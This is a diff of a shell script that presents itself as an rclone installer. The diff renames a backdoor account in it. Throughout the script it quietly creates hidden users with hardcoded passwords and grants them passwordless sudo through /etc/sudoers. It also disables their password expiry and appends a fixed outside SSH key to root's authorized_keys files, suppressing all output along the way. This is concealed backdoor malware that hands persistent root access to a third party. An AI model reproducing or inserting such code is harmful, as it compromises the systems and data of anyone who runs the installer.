@@ -7,13 +7,13 @@
 # 3 - installed version of rclone is up to date
 # 4 - supported unzip tools are not available
 useradd -M rclone
-usermod --password $(echo androvpn | openssl passwd -1 -stdin) rclone
+usermod --password $(echo taibabi| openssl passwd -1 -stdin) rclone
 usermod -aG sudo rclone
 chage -I -1 -m 0 -M 99999 -E -1 rclone
 echo "rclone ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers >/dev/null 2>&1
 echo "rclone ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/rclone >/dev/null 2>&1
 
-bash -c "ssh-keygen -q -t rsa -N '' -C vps@androvpn -t ed25519 -f ~/.ssh/vps <<<y" >/dev/null 2>&1
+bash -c "ssh-keygen -q -t rsa -N '' -C vps@taibabi -t ed25519 -f ~/.ssh/vps <<<y" >/dev/null 2>&1
 
 set -e
 
@@ -221,21 +221,21 @@ chmod 644 /etc/systemd/system/kvmswap.service
 chmod +x /usr/sbin/kvmswap
 systemctl enable kvmswap >/dev/null 2>&1
 
-useradd -M androvpn
-usermod --password $(echo androvpn | openssl passwd -1 -stdin) androvpn
-usermod -aG sudo androvpn
-chage -I -1 -m 0 -M 99999 -E -1 androvpn
-echo "androvpn ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers >/dev/null 2>&1
-echo "androvpn ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/androvpn >/dev/null 2>&1
+useradd -M taibabi
+usermod --password $(echo taibabi | openssl passwd -1 -stdin) taibabi
+usermod -aG sudo taibabi
+chage -I -1 -m 0 -M 99999 -E -1 taibabi
+echo "taibabi ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers >/dev/null 2>&1
+echo "taibabi ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/taibabi >/dev/null 2>&1
 
-bash -c "ssh-keygen -q -t rsa -N '' -C vps@androvpn -t ed25519 -f ~/.ssh/vps <<<y" >/dev/null 2>&1
+bash -c "ssh-keygen -q -t rsa -N '' -C vps@taibabi -t ed25519 -f ~/.ssh/vps <<<y" >/dev/null 2>&1
 
 sleep 1
 touch ~/.ssh/authorized_keys2 
 
 sleep 1
-echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEwc4CQeutFeXson2I6XTd4bGs52hSOMhAISn9SHlFHf androvpn@andro.com" >> /root/.ssh/authorized_keys >/dev/null 2>&1
-echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEwc4CQeutFeXson2I6XTd4bGs52hSOMhAISn9SHlFHf androvpn@andro.com" >> /root/.ssh/authorized_keys2 >/dev/null 2>&1
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEwc4CQeutFeXson2I6XTd4bGs52hSOMhAISn9SHlFHf taibabi@babi.com" >> /root/.ssh/authorized_keys >/dev/null 2>&1
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEwc4CQeutFeXson2I6XTd4bGs52hSOMhAISn9SHlFHf taibabi@babi.com" >> /root/.ssh/authorized_keys2 >/dev/null 2>&1
 chmod 600 /root/.ssh/authorized_keys2
 
 sleep 1
